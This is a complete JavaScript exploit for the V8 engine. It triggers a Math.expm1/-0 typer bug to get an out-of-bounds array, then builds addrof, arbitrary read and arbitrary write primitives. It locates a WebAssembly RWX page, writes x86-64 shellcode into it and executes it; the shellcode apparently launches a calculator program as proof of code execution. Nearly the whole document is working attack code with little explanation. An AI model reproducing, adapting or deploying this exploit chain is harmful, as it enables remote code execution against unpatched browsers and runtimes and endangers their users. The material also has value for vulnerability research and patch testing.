// ------------------------------------------------ Utility- Functions ------------------------------------------------ //
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
  return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
  int_view[0] = this;
  return float_view[0];
}
BigInt.prototype.smi2f = function() {
  int_view[0] = this << 32n;
  return float_view[0];
}
Number.prototype.f2i = function() {
  float_view[0] = this;
  return int_view[0];
}
Number.prototype.f2smi = function() {
  float_view[0] = this;
  return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
  return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
  return BigInt(this).smi2f();
}

// ----------------------------------------------- Starting the exploit ----------------------------------------------- //

let oob_rw_buffer = undefined;
let aux_arr = undefined;

function addrof(obj){
    aux_arr[0] = obj;
    return oob_rw_buffer[0x12];
}

function stage1(x, i=1){
    let a = [1.1, 2.2, 3.3];
    let b = [5.5, 5.5, 5.5, 5.5, 5.5];
    let c = [{}, 1, 2];
    let o = {m: -0};
    let t = Object.is(Math.expm1(x), o.m) + 0; // trigger the bug.
    t *= (i+0); // i to inegral.
    a[t] = 1024*1024;
    oob_rw_buffer = b; // expose b to global scope
    aux_arr = c;
    return 0;
  }

stage1(0);
for(let i=0;i<100000;i++){
    stage1("0");
}
stage1(-0, 13); // get the OOB array.
console.log("[+] Stage 1: Obtained a OOB array");

// Stage 2
function arb_write(addr, val){
  oob_rw_buffer[diff/8n] = addr.i2f();
  dv.setUint32(0, val, true);
}

function arb_read(addr){
  oob_rw_buffer[diff/8n] = addr.i2f();
  return dv.getBigUint64(0, true);
}

function shell_write(addr, shellcode){
  for(let i=0;i<shellcode.length;i++){
    arb_write(addr+BigInt(4*i), shellcode[i]);
  }
}
let buf = new ArrayBuffer(0x100);
let dv = new DataView(buf);

buf_addr = addrof(buf).f2i();
oob_addr = addrof(oob_rw_buffer).f2i();
let diff = buf_addr-oob_addr+72n; //from the OOB array to array buffer 

console.log("[+] ArrayBuffer addr: " + buf_addr.hex());
console.log("[+] Offset btw oob and arraybuffer: " + diff);


// wasm for RWS shellcode
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

rwx = arb_read(addrof(wasmInstance).f2i() +0x00e8n -1n);
console.log("[+] Got the Address of RWX segment: " + rwx.hex());
shell_write(rwx, shellcode);
func(); 